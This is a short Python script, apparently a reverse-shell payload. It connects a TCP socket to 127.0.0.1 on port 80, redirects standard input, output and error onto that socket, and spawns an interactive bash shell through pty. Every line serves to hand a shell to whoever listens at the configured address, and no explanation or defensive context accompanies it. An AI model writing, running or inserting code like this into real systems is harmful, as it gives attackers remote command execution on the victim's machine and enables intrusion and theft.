import os
import socket
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target_ip = "127.0.0.1"
target_port = 80
s.connect((target_ip, target_port))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn("bash")
